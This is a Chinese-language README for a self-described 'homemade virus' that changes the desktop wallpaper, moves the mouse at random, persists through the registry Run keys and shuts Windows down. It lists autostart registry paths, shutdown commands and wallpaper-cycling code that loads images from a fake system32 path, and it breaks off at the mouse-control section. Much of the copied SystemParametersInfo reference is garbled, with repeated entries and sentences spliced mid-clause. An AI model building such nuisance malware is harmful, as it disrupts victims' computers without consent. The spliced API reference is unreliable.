# c-cPlusPlus-Virus

自制病毒——控制桌面背景鼠标以及开关机

# 目录
* [理论知识](#理论知识)
    * [修改桌面背景方法](#修改桌面背景方法)
    * [控制鼠标方法](#控制鼠标方法)
    * [开机自启动方法](#开机自启动方法)
    * [关机方法](#关机方法)
* [实现](#实现)
    * [修改桌面背景代码](#修改桌面背景代码)
    * [控制鼠标代码](#控制鼠标代码)
    * [开机自启动代码](#开机自启动代码)
    * [关机代码](#关机代码)
* [代码](#代码)
* [参考](#参考)

# 理论知识

## 修改桌面背景方法

在Windows下，修改桌面背景可以使用特定的API : SystemParametersInfo

该函数也可以在设置参数中更新用户配置文件，这个函数还有很多其它功能，比如获取桌面工作区的大小。

>BOOL SystemParametersInfo（UINT uiAction，UINT uiParam，PVOID pvParam，UINT fWinlni）;

### uiAction：该参数指定要查询或设置的系统级参数。其取值如下；
    
    SPI_GETACCESSTIMEOUT：检索与可访问特性相关联的超时段的信息，PvParam参数必须指向某个ACCESSTIMEOUT结构以获得信息，并将该结构中的cbSjze成员和ulParam参数的值设为sizeof（ACCESSTIMEOUT）。

    SPI_GETACTIVEWINDOWTRACKING：用于Windows 98和Windows NT 5.0及以后的版本。它表示是否打开活动窗口跟踪（激活该窗口时鼠标置为开状态），pvParam参数必须指向一个BOOL型变量（打开时接收值为TRUE，关闭时为FALSE）。

    SPI_GETACTIVEWNDTRKZORDER；用于Windows 98和Windows NT 5.0及以后版本。它表示通过活动窗口跟踪开关激活的窗口是否要置于最顶层。pvParam参数必须指向一个BOOL型变量，如果要置于顶层，那么该变量的值为TRUE，否则为FALSE。

    SPI_GETACTIVEWNDTRKTIMEOUT：用于Windows 98和 Windows NT 5.0及以后版本。它指示活动窗口跟踪延迟量，单位为毫秒。pvParam参数必须指向DWORD类型变量，以接收时间量。
    
    SPI_GETANIMATION：检索与用户活动有关的动画效果。pvParam参数必须指向ANIMATIOINFO结构以接收信息。并将该结构的cbSize成员和ulParam参数置为sizeof（ANIMATIONINFO）。
    
    SPI_GETBEEP：表示警告蜂鸣器是否是打开的。pvParam参数必须指向一个BOOL类型变量，如果蜂鸣器处于打开状态，那么该变量的值为TRUE，否则为FALSE。
    
    SpI_GETBORDER：检索决定窗口边界放大宽度的边界放大因子。pvParam参数必须指向一个整型变量以接收该值。
    
    SPI_GETDEFAULTINPUTLANG：返回用于系统缺省输入语言的键盘布局句柄。pvParam参数必须指向一个32位变量，以接收该值。
    
    SPI_GETCOMBOBOXANIMATION：用于Windows 98和Windows NT 5.0及以后版本。它表示用于组合柜的动打开效果是否允许。pvParam参数必须指向一个BOOL变量，如果允许，那么变量返回值为TRUE，否则为FALSE。
    
    SPI_GETDRAGFULLWINDOWS：确定是否允许拖拉到最大窗口。pvParam参数必须指向BOOL变量，如果允许，返回值为TRUE，否则为FALSE。对于Windows 95系统，该标志只有在安装了Windows plus!才支持。
    
    SPI_GETFASTTASKSWITCH：该标志已不用！以前版本的系统使用该标志来确定是否允许Alt+Tab快速任务切换。对于Windows 95、Windows 98和Windows NT 4.0版而言，快速任务切换通常是允许的。
    
    SPI_GETLDWPOWERACTIVE：确定是否允许屏幕保护的低电压状态。如果允许，那么指向BOOL变量的pvParam参数会接收到TRUE值，否则为FALSE。对于Windows 98,该标志对16位和32位应用程序都支持。    对于Windows 95，该标志只支持16位应用程序。对于Windows NT，在Windows NT 5.0及以后版本中支持32位应用程序，对16位应用程序则不支持。

    SPI_GETLOWPOWERTIMEOUT：检索用于屏幕保护的低电压状态超时值。pvParam参数必须指向一个整型变量，以接收该值。对于Windows 98该标志支持16位和32位应用程序。对于Windows95，该标志只支持16位应用程序。对于Windows NT,该标志支持Windows NT 5.0及以后版本上的32位应用程序。不支持16位应用程序。

    SPI_GETMENUDROPALIGNMENT。确定弹出式菜单相对于相应的菜单条项是左对齐，还是右对齐、参数pvParam必须指向一个BOOL类型变量，如果是左对齐。那么该变量值为TRUE，否则为FALSE。SPI_GETMINIMIZEDMETRICS：检索最小化窗口有关的度量数据信息。参数pvParam必须指向MINIMIZEDMETRCS结构，以接收信息。该结构中的cbSize和ulParam参数的值应设为sizeof（MINIMIZEDMETRICS）。

    SPI_GETMOUSE：检索鼠标的2个阈值和加速特性。pvParam参数必须指向一个长度为3的整型数组，分别存储此值。

    SPI_GETMOUSEHOVERHEGHT：用于Windows NT 4.0及以后版本或Windows 98。获得在TrackMouseEvent事件中，为产生WM_MOUSEOVER消息而鼠标指针必须停留的矩形框的高度,以像素为单位。参数pvParam必须指向一个UINT变量以接收这个高度值。

    SPI_GETMOUSEHOVERTIME：用于Windows NT 4.0及以后版本、Windows 98，获得在TrackMouseEvent事件中，为产生WM_MOUSEOVER消息而鼠标指针必须停留在矩形框内的时间，单位为毫秒。参数pvParam必须指向一个UINT变量以接收该时间值。

    SPI_GETMOUSEHOVERWIDTH：用于Windows NT 4.0及以后版本、Windows 98。获得在TrackMouseEvent事件中，为产生WM_MOUSEOVER消息而鼠标指针必须停留的矩形框的宽度,以像素为单位。参数pvParam必须指向一个UINT变量以接收这个宽度值。

    SPI_GETMOUSEKEYS：检索与MOUSEKEYS易用特征有关的信息，pvParam参数必须指向某个MOUSEKEYS结构，以获取信息。应将结构的cbSize成员和ulParam参数设置为sizeof（MOUSEKEYS）。

    SPI_GETMOUSESPEED：用于Windows NT 5.0及以后版本、Windows 98。检索当前鼠标速度。鼠标速度决定了鼠标移动多少距离，鼠标的指针将移动多远。参数pvParam指向一个整型变量，该变量接收1（最慢）至20（最快）之间的数值。缺省值为们10。这个值可以由最终用户使用鼠标控制面板应用程序或使用调用了SPI_SETMOUSESPEED的应用程序来设置。

    SPI_GETMOUSETRAILS：用于WpvParam必须指向一个BOOL类型变量，如果是左对齐。那么该变量值为TRUE，否则为FALSE。

    SPI_GETMINIMIZEDMETRICS：检索最小化窗口有关的度量数据信息。参数pvParam必须指向MINIMIZEDMETRCS结构，以接收信息。该结构中的cbSize和ulParam参数的值应设为sizeof（MINIMIZEDMETRICS）。

    SPI_GETMOUSE：检索鼠标的2个阈值和加速特性。pvParam参数必须指向一个长度为3的整型数组，分别存储此值。

    SPI_GETMOUSEHOVERHEGHT：用于Windows NT 4.0及以后版本或Windows 98。获得在TrackMouseEvent事件中，为产生WM_MOUSEOVER消息而鼠标指针必须停留的矩形框的高度,以像素为单位。参数pvParam必须指向一个UINT变量以接收这个高度值。

    SPI_GETMOUSEHOVERTIME：用于Windows NT 4.0及以后版本、Windows 98，获得在TrackMouseEvent事件中，为产生WM_MOUSEOVER消息而鼠标指针必须停留在矩形框内的时间，单位为毫秒。参数pvParam必须指向一个UINT变量以接收该时间值。

    SPI_GETMOUSEHOVERWIDTH：用于Windows NT 4.0及以后版本、Windows 98。获得在TrackMouseEvent事件中，为产生WM_MOUSEOVER消息而鼠标指针必须停留的矩形框的宽度,以像素为单位。参数pvParam必须指向一个UINT变量以接收这个宽度值。

    SPI_GETMOUSEKEYS：检索与MOUSEKEYS易用特征有关的信息，pvParam参数必须指向某个MOUSEKEYS结构，以获取信息。应将结构的cbSize成员和ulParam参数设置为sizeof（MOUSEKEYS）。SPI_GETMOUSESPEED：用于Windows NT 5.0及以后版本、Windows 98。检索当前鼠标速度。鼠标速度决定了鼠标移动多少距离，鼠标的指针将移动多远。参数pvParam指向一个整型变量，该变量接收1（最慢）至20（最快）之间的数值。缺省值为们10。这个值可以由最终用户使用鼠标控制面板应用程序或使用调用了SPI_SETMOUSESPEED的应用程序来设置。

    SPI_GETMOUSETRAILS：用于Windows 95及更高版本。它用来表示是否允许MouseTrails（鼠标轨迹）。该特征通过简单地显示鼠标轨迹并迅速擦除它们来改善鼠标的可见性。参数prParam必须指向一个整型变量来接收该值。如果这个值为0或1，那么表示禁止该特征。如果该值大于1，则说明该特征被允许，并且该值表示在鼠标轨迹上画出的光标数目。参数ulParam不用。

    SPI_GETNONCLIENTMETRICS：检索与非最小化窗口的非客户区有关的度量信息。参数pvParam必须指向NONCLIENTMETRICS结构，以便接收相应值。该结构的。cbSize成员与ulParam参数值应设为sizeof（NONCLIENTMETRICS）。对于Windows 98，该标志支持16位和32位应用程序。对于Windows 95，该标志只支持16位应用程序。对于Windows NT该标志在NT 5.0及以后版本中支持32位应用程序，不支持16位应用程序。

    SPI_GETPOWEROFFACTIVE：确定是否允许屏幕保护中关电。TRUE表示允许，FA参数pvParam必须指定SERIALKEYS结构来接收信息。该结构中的cbSize成员和ulParam参数的值要设为sizeof（SERIALKEYS）。

    SPI_GETSHOWSOUNDS：确定ShowSounds易用特性标志是开或是关。如果是开，那么用户需要一个应用程序来可视化地表达信息，占则只能以听得见的方式来表达。参数pvParam必须指向一个BOOL类型变量。该变量在该特征处于开状态时返回TRUE，否则为FALSE。使用这个值等同于调用GetSystemMetrics（SM_SHOWSOUNDS）。后者是推荐使用的调用方式。

    SPI_GETSNAPTODEFBUTTON：用于Windows NT 4.0及以后版本、Windows 98：确定 Snap-TO-Default-Button（转至缺省按钮）特征是否允许。如果允许，那么鼠标自动移至缺省按钮上，例如对话框的"Ok"或"Apply"按钮。pvParam参数必须指向Bool类型变量，如果该特征被允许，则该变量接收到TRUE，否则为FALSE。

    SPI_GETSOUNDSENTRY：检索与SOUNDSENTRY可访问特征有关的信息。参数pvParam必须指向SOUNDSENTRY结构以接收信息。该结构中的。cbSize或员和ulParam参数的值要设为sizeof（SOUNDSENTRY）。

    SPI_GETSTICKYKEYS：检索与StickyKeys易用特征有关的信息。参数 pvParam必须指向STICKYKEYS结构以获取信息。该结构中的cbSze成员及ulParam参数的值须设为sizeof（STICKYKEYS）。

    SPI_GETSWITCHTASKDISABLE：用于Windows NT 5.0、Windows 95及以后版本，确定是否允许Alt+Tab和AIt+Esc任务切换。参数pvParam必须指向UINT类型变量，如果禁止任务切换，那么返回值为1，否则为0。在缺省情况下，是允许进行任务切换的。

    SPI_GETTOGGLEKEYS：检索与ToggleKeys易用特性有关的信息。参数pvParam必须指向TOGGLEKEYS结构以获取信息。该结构中的cbSize成员和ulParam参数值要设置sizeof（TOGGLEKEYS）。

    SPI_GETWHEELSCROLLLINES：用于Windows NT 4.0及以后版本、Windows 98。当前轨迹球转动时，获取滚动的行数。参数pvParam必须指向UINT类型变量以接收行数。缺省值是3。

    SPI_GETWINDOWSEXTENSION：在Windows 95中指示系统中是否装了Windows Extension和Windows Plus！。    参数ulParam应设为1。而参数pvParam则不用。如果安装了Windows Extenson，那么该函数返回TRUE，否则为FALSE。

    SPI_GETWORKAREA：检索主显示器的工作区大小。工作区是指屏幕上不被系统任务条或应用程序桌面工具遮盖的部分。参数pvParam必须指向RECT结构以接收工作区的坐标信息，坐标是用虚拟屏幕坐标来表示的。为了获取非主显示器的工作区信息，请调用GetMonitorlnfo函数。参数ulParam指定宽度，单位是像素。

    SPI_ICONVERTICALSPACING：设置图标单元的高度。参数ulParam指定高度，单位是像素。

    SPI_LANGDRIVER：未实现。

    SPI_SCREENSAVERRUNNING：改名为SPI_SETSCREENSAVERRUNNING。

    Spl_SETACCESSTIMEOUT：设置与可访问特性有关的时间限度值，参数 pvParam必须指向包含新参数的ACCESSTIMEOUT结构，该结构的cbSize成员与ulParam参数的值要设为sizeof（ACCESSTMEOUT）。

    SPI_SETACTIVEWINDOWTRACKING：用于Windows NT 5.0及以后版本、Windows 98。设置活动窗口追踪的开或关，如果把参数pvParam设为TRUE，则表示开。pvParam参数为FALSE时表示关。

    SPI_SETACTIVEWNDTRKZORDER：用于Windows NT 5.0及以后版本、Windows 98。表示是否把通过活动窗口跟踪而激活的窗口推至顶层。参数pvParam设为TRUE表示推至顶层，FALSE则表示不推至顶层。

    SPI_SETACTIVEWNDTRKTIMEOUT：用于Wlindows NT 5.0及以后版本、Windows 98。设置活动窗口跟踪延迟。    参数pvParam设置在用鼠标指针激活窗口前需延迟的时间量，单位为毫秒。

    SPI_SETBEEP：将警蜂器打开或关闭。参数ulParam指定为TRUE时表示打开，为FALSE时表示关闭。

    SPI_SETBORDER：设置确定窗口缩放边界的边界放大因子。参数ulParam用来指定该值。

    SPI_SETCOMBOBOXANIMATION：用于Windows NT 5.0及以后版本和Windows 98。允许或禁止组合滑动打开效果。如果设置pvParam参数为TRUE，则表示允许有倾斜效果，如果设为FALSE则表示禁止。

    SPI_SETCURSORS：重置系统光标。将ulParam参数设为0并且pvParam参数设为NULL。

    SPI_SETDEFAULTINPUTLANG：为系统Shell（命令行解器）和应用程序设置缺省的输入语言。指定的语言必须是可使用当前系统字符集来显示的。pvParam参数必须指向DWORD变量，该变量包含用于缺省语言的键盘布局句柄。

    SpI_SETDESKpATTERN：通过使Windows系统从WIN.INI文件中pattern=设置项来设置当前桌面模式。

    SPI_SETDESKWALLPAPER：设置桌面壁纸。pvParam参数必须指向一个包含位图文件名，并且以NULL（空）结束的字符串。

    SPI_SETDOUBLECLICKTIME：设ulParam参数的值为目标双击时间。双击时间是指双击中的第1次和第2次点击之间的最大时间，单位为毫秒。也可以使用SetDoubleClickTime函数来设置双击时间。为获取当前双击时间，请调用GetDoubleClickTime函数。

    SPI_SETDOUBLECLKHEGHT：将ulParam参数的值设为双击矩形区域的高度。双击矩形区域是指双击中的第2次点击时鼠标指针必须落在的区域，这样才能记录为双击。

    SPI_SETDOUBLECLKWIDTH：将ulParam参数的值设为双击矩形区域的宽度。

    SPI_SETDRAGFULLWINDOWS：设置是否允许拖至最大窗口。参数uIParam指定为TRUE时表示为允许，为FALSE则不可。对于Windows 95，该标志只有在安装了Windows plus!才支持。

    SPI_SETDRAGHEIGHT：设置用于检测拖拉操作起点的矩形区域的高度，单位为像素。参考GETSYSTEMMETRICS函数的nlndex参数中的SM_CXDRAG和SM_CYDRAG。

    SPI_SETDRAGWIDTH：设置用于检测拖拉操作起点的矩形区域的宽度，单位为像素。

    SPI_SETFASTTASKSWITCH：该标志己不再使用。以前版本的系统使用此标志来允许或不许进行Alt+Tab快速任务切换。对于Windows 95、Windows 98和Windows NT 4.0，通常都允许进行快速任务切换。参考SPI_SETSWITCHTASKDISABLE。

    SPI_SETFILTERKEYS：设置FilterKeys易用特性的参数。参数pvParam必须指向包含新参数的FILTERKEYS结构，该结构中的cbSize成员和参数ulParam的值应设为sizeof（FILTERKEYS）。

    SPI_SETFONTSMOOTHING：允许或禁止有字体平滑特性。该特性使用字体保真技术，通过在不同灰度级上涂画像素点来使得字体曲线显得更加平滑，为了允许有该特性，参数ulParam应设为TRUE值，否则为FALSE。对于Windows 95，只有在安装了Windows plusl才支持该标志。

    SPI_SETFOREGROUNDFLASHCOUNT：用于Windows 98和Windows NT 5.0及以后版本。设置SetForegroundWindow在拒绝前台切换申请时闪烁任务拦按钮的次数。

    SPI_SETFOREGROUNDLOCKTIMEOUT：用于Windows 98和Windows NT 5.0及以后版本。它用来设置在用户输入之后，系统禁止应用程序强行将自己进入前台期间的时间长度，单位为毫秒。参数pvParam设置这个新的时间限度值。

    SPI_SETGRADIENTCAPTIONS：用于Windows 98和Windows NT 5.0及以后版本。允许或禁止窗口标题栏有倾斜效果。如果允许则将参数pvParam设置为TRUE，否则设为FALSE。有关倾斜效果方面更多信息，请参考GetSysColor函数。

    SPI_SETGRIDGRANULARITY：将桌面缩放时网格的颗粒度值设置为参数ulParam中的值。

    SPI_SETHANDHELD：内部使用，应用程序不应使用该值。

    SPI_SETHIGHCONTRAST：用于Windows 95及以后版本、Windows NT 5.0及以后版本。设置HighContrast可访问特性的参数。参数pvParam必须指向HIGHCONTRAST结构，该结构包含新的参数。该结构中的cbSize成员及参数ulParam的值设为sizeof（HIGHCONTRAST）。

    SPI_SETICONMETRICS：设置与图标有关的信息。参数pvParam必须指向包含新参数的ICONMETRICS结构，另外还要将参数ulParam和该结构中的cbSize成员的值设置为sizeof（ICONMETRICS）。

    SPI_SETICONS：重新加载系统图标。参数ulParam的值应设为0，而pvParam参数应设为NULL。

    SPI_SETICONTITLELOGFONT：设置用于图标标题的字体。参数ulParam指定为logfont结构的大小，而参数pvParam必须指向一个LOGFONT结构。

    SPI_SETICONTITLEWRAP：打开或关闭图标标题折行功能。若想打开折行功能，则把参数ulParam设为TRUE，否则为FALSE。

    SPI_SETKEYBOARDDELAY：设置键盘重复延迟。参数ulParam必须指定为0，1，2或3。其中0表示设置为最短延迟（大约 250ms）3，表示最大延迟（大约 1 秒）。与每个值对应的实际的延迟时间根据硬件情况有可能有些变化。

    SPI_SETKEYBOARDPREF：用于Windows 95及以后版本、Windows NT 5.0及以后版本，设置键盘优先序。如果用户依赖键盘而不是鼠标，那么可将参数ulParam指定为TRUE，否则设为FALSE，并且要求应用程序显示而不隐蔽键盘接口。

    SPI_SETKEYBOARDSPEED：设置键盘重击键速度。参数ulParam必须指定一个从0到31的值，其中0表示设置成最快速度（大约30次/秒），31表示设置为最低速度（大约2。5次/秒），实际的重速率与硬件有关，而且可能变动幅度高达20%。如果ulParam大于31，那么该参数仍设置为31。

    SPI_SETLANGTOGGLE：为输入语言间切换设置热键集。参数ulParam和pvParam不用。该值通过读取注册表来设置键盘属性表单中的快捷键。在使用该标志之前必须设置注册表，注册表中的路径是"1"=Alt+shift，"2"=Ctrl+shift，"3"=none（无）。

    SPI_SETLISTBOXSMOOTHSCROLLING：用于Windows 98和Windows NT 5.0及以后版本。允许或不许列表栏有平滑滚动效果。参数pvParam设置为TRUE表示允许有平滑滚动效果，为FALSE则表示禁止。

    SPI_SETLOWPOWERACTIVE：激活或关闭低电压屏幕保护特性。参数ulParam设为1表示激活，0表示关闭。参数pvParam必须设为NULL。对于Windows 98,该标志支持16位和32位应用程序。对于Windows 95，该标志只支持16位应用程序。对于Windows NT．该标志只支持NT 5.0及以后版本的32位应用程序，不支持16位应用程序。

    SPI_SETLOWPOWERTIMEOUT：用于设置低电压屏幕保护中的时间值（也称超时值，即在超过某一时间段后自动进行屏幕保护），单位为秒。uIParam参数用来指定这个新值。参数pvParam必须为NULL。对于Windows98，该标志支持16位和32位应用程序。对于Windows 95，该标志只支持16位应用程序。对于Windows NT该标志只支持NT 5.0及以后版本的32位应用程序，不支持16位应用程序。

    SPI_SETMENUDROPALIGNMENT：设置弹出或菜单的对齐方式。参数ulParam指定为TRUE时表示是右对齐，FALSE时为左对齐。

    SPI_SETMINIMIZEDMETRICS：设置与最小化窗口有关的数据信息，参数pvParam必须指向包含新参数的MINIMIZEDMETRICS结构。该结构中的cbSize成员与ulParam参数的值应设为sizeof（MINMIZEDMETRICS）。

    SPI_SETMOUSE：设置鼠标的两个阀值和加速率。参数pvParam必须指向一个长度为3的数组，以指定这些值。详细请参考mouse_event。

    SPI_SETMOUSEBUTTONSWAP：调换或恢复鼠标左右按钮的含义，为FALSE时表示恢复原来的含义。

    SPI_SETMOUSEHOVERHEGHT：用于Windows 98和Windows NT 4.0及以后版本。设置鼠标指针停留区域的高度，以像素为单位。鼠标指针在此区域停留是为了让TrackMouseEvent产生一条WM_MUOSEHOVER消息，参数ulParam用来设置此高度值。

    SPI_SETMOUSEHOVERTIME：用于Windows 98和Windows NT 4.0及以后版本。设置鼠标指针为了让TrackMouseEvent产生WM_MOUSEHOVER事件而在停留区域应停留的时间。该标志只有在将调用dwHoverTime参数中的HOVER_DEFAULT值传送到TrackMouseEvent时才使用。参数ulParam设置这个新的时间值。

    SPI_SETMOUSEHOVERWIDTH：用于Windows 98和Windows NT 4.0及以后版本。设置鼠标指针停留区域的宽度，以像素为单位。参数ulParam设置该新值。

    SPI_SETMOUSEKEYS：设置MouseKeys易用特性的参数。参数pvParam必须指向包含新参数的MOUSEKEYS结构。结构中的cbSize成员与参数ulParam的值应设为sizeof（MOUSEKEYS）。

    SPI_SETMOUSESPEED：用于Windows NT 5.0及以后的版本和Windows 98，设置当前鼠标速度。参数pvParam必须指向一个1（最慢）至20（最快）之间的整数。缺省值是10。一般可以使用鼠标控制面板应用程序来设置该值。

    SPI_SETMOUSETRAILS：用于Windows 95及以后版本：允许或禁止有MoouseTrails（鼠标轨迹）特性。该特性通过简短地显示鼠标光标轨迹，并迅速地擦除它们来提高鼠标的可见度。禁止该特性可将参数ulParam设为0或1，允许时,将ulParam设置为一个大于1的数值，该值表示轨迹中画出的光标个数。

    SPI_SETNONCLIENTMETRICS：设置与非最小化窗口的非客区有关的数据信息，参数pvParam必须指向NONCLIENTMETRICS结构，该结构包含新的参数。其成员cbSzie和参数ulParam的值应设为sizeof（NONCLIENTMETRICS）。

    SPI_SETPENWINDOWS；用于Windows 95及以后版本：指定是否加载笔窗口，当加载时，参数ulParam设为TRUE，不加载时为FALSE。参数pvParam为NULL。

    SPI_SETPOWEROFFACTIVE：激活或关闭屏幕保护特性参数。ulParam设为1表示激活，0表示关闭。参数pvParam必须为NULL。对于Windows 98，该标志支持16位和32位应用程序。对于Windows 95，该标志只支持16位应用程序。对于Windows NT，该标志支持Windows NT 5.0及以后版本的32位应用程序，不支持16位应用程序。

    SPI_SETPOWEROFFTIMEOUT：设置用于关闭屏幕保护所需的时间值（也称超时值）。参数ulParam指定该值。参数pvParam必须为NULL。对于Windows 98．该标志支持16位和32位应用程序。对于Windows 95，该标志只支持16位应用程序。对于Windows NT,该标志支持Windows NT 5.0及以后版本上的32位应用程序，不支持16位应用程序。

    SPI_SETSCREENREADER；用于Windows 95及以后版本、Windows NT 5.0及以后版本，表示屏幕审阅程序是否运行。参数uiparm指定为TRUE表示运行该程序，FALSE则不运行。

    SPI_SETSCREENSAVERRUNNING：用于Windows 95及以后版本，内部使用。应用程序不应该使用此标志SPI_SETSETSCREENSAVETIMEOUT：参数ulParam值为屏幕保护器时间限度值。该值是一个时间量，以秒为单位，在屏幕保护器激活之前，系统应该一直是空闲的，超过这个值就激活屏幕保护器。

    SPI_SETSERIALKEYS：用于Windows 95及以后版本：设置SerialKeys易用特性的参数。参数pvParam必须指向包含新参数的SERIALKEYS结构，其成员cbSize和参数ulParam应设为sizeof（SERIALKEYS）。

    SPI_SETSHOWSOUNDS：将ShowSounds易用特性设置为打开或关闭。参数ulParam指定为TRUE时表示打开，FALSE表示关闭。

    SPI_SETSNAPTODEFBUTTON：用于Windows NT 4.0及以后版本、Windows 98。允许或禁止有snap-to-default-button（跳转至缺省按钮）特性。如果允许，那么鼠标光标会自动移至缺省按钮上，例如对话柜中的OK或"apply"按钮。参数ulParam设为TRUE表示允许该特性，FALSE表示禁止。

    SPI_SETSOUNDSENTRY：设置SOUNDSENTRY易用特性的参数。参数pvParam必须指向SOUNDSENTRY结构，该结构包含新参数，其成员cbSize和参数ulParam的值应设为sizeof（SOUNDSENTRY）。

    SPI_SETSTICKYKEYS：设置stickykeys可访问特性的参数。参数pvParam必须指向包含新参数的stickykeys结构，其成员cbSize和ulParam参数的值要设为sizeof（STICKYKEYS）。

    SPI_SETSWITCHTASKDISABLE：用于Windows NT 5.0及以后版本，允许或禁止有Alt+Tab和Alt+Esc任务切换特性。参数ulParam设为1表示允许有该特性，设为0则表示禁止。缺省情况下是允许有任务切换特性的。

    SPI_SETTOGGLEKEYS：设置togglekeys可访问特性的参数，参数PvParam必须指向TOGGLEKEYS结构，该结构中包含新的参数。其成员cbSize和参数ulParam的值要设为sizeof（togglekeys）。

    SPI_SETWHEELSCROOLLLINES：用于Windows 98和Windows NT 4.O及以后版本。设置当鼠标轨迹球转动时要滚动的行数，滚动的行数是由参数ulParam设置的，该行数是在鼠标轨迹球滚动，并且没有使用修改键时的滚动行数。如果该数值为0，那么不会发生滚动，如果滚动行数比可见到的行数要大，尤其如果是WHEEL_PAGESCROLL（#defined sa UINT_MAX），那么滚动操作应该被解释成在滚动条的下一页或上一页区点击一次。

    SPI_SETWORKAREA：设置工作区域大小。工作区是指屏幕上没有被系统任务栏或桌面应用程序桌面工具遮盖的部分。参数pvParam是一个指针。指向RECT结构，该结构规定新的矩形工作区域，它是以虚拟屏幕坐标来表达的。在多显示器系统中，该函数用来设置包含特定矩形的显示器工作区域。如果PvParam为NULL，那么该函数将主显示器的工作区域设为全屏。

### [更多](https://github.com/CasterWx/c-cPlusPlus-Virus)

### uiParam：uiParam 在参数说明中所有为ulParam均为错误。

    这个参数值设为true即可。

### pvParam：与查询或设置的系统参数有关。关于系统级参数的详情，请参考uiAction参数。否则在没有指明情况下，必须将该参数指定为NULL。
    
    在修改背景图片时为图片信息，PVOID类型。

### fWinlni：如果设置系统参数，则它用来指定是否更新用户配置文件（Profile）。亦或是否要将WM_SETTINGCHANGE消息广播给所有顶层窗口，以通知它们新的变化内容。该参数可以是0或下列取值之一：

    SPIF_UPDATEINIFILE：把新的系统参数的设置内容写入用户配置文件。
    
    SPIF_SENDCHANGE：在更新用户配置文件之后广播WM_SETTINGCHANGE消息。
    
    SPI_SENDWININICHANGE与 SPIF_SENDCHANGE一样。
    
### 返回值

    如果函数调用成功，返回值非零：如果函数调用失败，那么返回值为零。

## 控制鼠标方法

控制鼠标坐标的方法同样也时调用一个API，GetCursorPos和SetCursorPos

### GetCursorPos用于获取鼠标句柄
    
    #include<stdio.h>
    #include<windows.h>
    int main()
    {
        POINT p;
        GetCursorPos(&p);
        
        return0;
    }
    
### SetCursorPos用于移动鼠标

在使用GetCursorPos获取鼠标句柄之后，可以调用SetCursorPos移动鼠标，它的两个参数分别是x轴和y轴。

    函数原型：BOOL SetCursorPos（int X，int Y）；
    参数：
    X：指定光标的新的X坐标，以屏幕坐标表示。
    Y：指定光标的新的Y坐标，以屏幕坐标表示。
    返回值：如果成功，返回非零值；如果失败，返回值是零，若想获得更多错误信息，请调用GetLastError函数。
    备注：该光标是共享资源，仅当该光标在一个窗口的客户区域内时它才能移动该光标。
    
## 开机自启动方法

### 注册表
开机自启动的实现方法就是通过注册表实现，在注册表中有固定的开机自启程序设置位置

    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run;

    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce;
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run;
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce;
    
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx

在这几项中有我们电脑中的开机自启动程序信息，

![s](http://images.cnblogs.com/cnblogs_com/LexMoon/1246510/o_regedit.jpg)

例如这个WeChat就是开机时的微信登录程序。

### 注册表读写方法

#### RegCreateKey
    
    // 打开注册表
    LONG WINAPI RegCreateKey(
    _In_ HKEY hKey,
    _In_opt_ LPCTSTR lpSubKey,
    _Out_ PHKEY phkResult
    );
    
**hKey**
指向当前打开表项的句柄，或者是下列预定义保留句柄值之一，实际上就是注册表中的几个分支。
  
**lpSubKey**
指向一个空终止的字符串指针，指示这个函数将打开或创建的表项的名称。这个表项必须是由hKey参数所标识的项的子项

**phkResult**
这是一个返回值，指向一个变量的指针，用来接受创建或打开的表项的句柄。当不再需要此返回的注册表项句柄时，调用RegCloseKey函数关闭这个句柄。

#### RegSetValueEx

    // 读写注册表
    LONG RegSetValueEx(
        HKEY hKey,
        LPCTSTR lpValueName,
        DWORD Reserved,
        DWORD dwType,
        CONST BYTE *lpData,
        DWORD cbData
    );

**hKey**
一个已打开项的句柄，或指定一个标准项名

**lpValueName**	
指向一个字符串的指针，该字符串包含了欲设置值的名称。若拥有该值名称的值并不存在于指定的注册表项中，则此函数将其加入到该项。如果此值是NULL，或指向空字符串，则此函数为该项的默认值或未命名值设置类型和数据。

**Reserved**	
保留值，必须强制为0

**dwType**	
指定将被存储的数据类型，该参数可以为

    REG_BINARY 任何形式的二进制数据
    REG_DWORD 一个32位的数字
    REG_DWORD_LITTLE_ENDIAN 一个“低字节在前”格式的32位数字
    REG_DWORD_BIG_ENDIAN 一个“高字节在前”格式的32位数字
    REG_EXPAND_SZ 一个以0结尾的字符串，该字符串包含对环境变量（如“%PAHT”）的未扩展引用
    REG_LINK 一个Unicode格式的带符号链接
    REG_MULTI_SZ 一个以0结尾的字符串数组，该数组以连接两个0为终止符
    REG_NONE 未定义值类型
    REG_RESOURCE_LIST 一个设备驱动器资源列表
    REG_SZ 一个以0结尾的字符串

**lpData**	
指向一个缓冲区，该缓冲区包含了欲为指定值名称存储的数据。

**cbData**	
指定由lpData参数所指向的数据的大小，单位是字节。
        
## 关机方法

Windows 系统自带一个名为Shutdown.exe的程序，可以用于关机操作（位置在Windows\System32下），一般情况下Windows系统的关机都可以通过调用程序 shutdown.exe来实现的，同时该程序也可以用于终止正在计划中的关机操作。

    shutdown-a　取消关机
    shutdown -s 关机
    shutdown -f　强行关闭应用程序
    shutdown -m \\计算机名　控制远程计算机
    shutdown -i　显示“远程关机”图形用户界面，但必须是Shutdown的第一个参数 　
    shutdown -l　注销当前用户
    shutdown -r　关机并重启
    shutdown -s -t 时间　设置关机倒计时
    shutdown -h 休眠
    
     
# 实现

## 修改桌面背景代码
图片信息使用了一个PVOID数组，并通过一个for循环不断切换桌面背景。

    #include<stdio.h>
    #include<windows.h>
    #include<iostream>
    #include <tchar.h>
    #include<cstdlib>
    #include<ctime>
    using namespace std ;
    
    int main(){
       PVOID s[10] = {
            (PVOID)"D:\\windows\\system32\\bin\\background.jpg" ,
            (PVOID)"D:\\windows\\system32\\bin\\background1.jpg" ,
             ...
            (PVOID)"D:\\windows\\system32\\bin\\background6.jpg" ,
            (PVOID)"D:\\windows\\system32\\bin\\background7.jpg" ,
            (PVOID)"D:\\windows\\system32\\bin\\background8.jpg" ,
            (PVOID)"D:\\windows\\system32\\bin\\background9.jpg"
            };
        SystemParametersInfo(20, true,s, 1) ;
        for(int i=0;i<10;i++){
            SystemParametersInfo(20, true,s[i], 1) ;
            Sleep(1000);//控制时间间隔
        }
    
        return 0 ;  
    }

## 控制鼠标代码
利用随机数和while死循环达到鼠标不受控制疯狂随机移动的功能。

